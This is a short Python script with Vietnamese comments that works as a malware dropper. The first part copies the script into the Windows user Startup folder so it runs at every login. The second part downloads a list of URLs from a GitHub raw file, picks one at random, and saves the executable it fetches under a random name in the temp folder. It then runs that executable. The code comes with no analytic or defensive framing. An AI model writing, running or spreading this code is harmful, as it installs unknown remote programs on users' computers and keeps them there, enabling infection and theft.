import os
import shutil

# Đường dẫn của tệp hiện tại
current_file = __file__

# Đường dẫn tới thư mục Startup của người dùng
startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

# Đường dẫn tới tệp trong thư mục Startup (giữ nguyên tên gốc của tệp)
destination_file = os.path.join(startup_folder, os.path.basename(current_file))

# Sao chép tệp hiện tại vào thư mục Startup
if not os.path.exists(destination_file):
    shutil.copy(current_file, destination_file)
    print(f"Tệp đã được sao chép vào {destination_file}")
else:
    print(f"Tệp đã tồn tại trong {destination_file}")

import os
import random
import string
import urllib.request
import tempfile
import subprocess

# URL tới file chứa danh sách các URL tải file
url_list = "https://raw.githubusercontent.com/43a1723/w/main/urls_file.txt"

# Tải nội dung file danh sách URL
response = urllib.request.urlopen(url_list)
url_content = response.read().decode('utf-8')
urls = url_content.splitlines()

# Chọn ngẫu nhiên một URL từ danh sách
random_url = random.choice(urls)

# Tạo một tên file ngẫu nhiên
file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".exe"

# Lấy đường dẫn tới thư mục tạm %temp%
temp_dir = tempfile.gettempdir()

# Đường dẫn đầy đủ của file sẽ được lưu vào %temp%
temp_file_path = os.path.join(temp_dir, file_name)

# Tải file từ URL và lưu vào %temp%
urllib.request.urlretrieve(random_url, temp_file_path)
print(f"Tải file thành công: {temp_file_path}")

# Thực thi file vừa tải
subprocess.run([temp_file_path], shell=True)
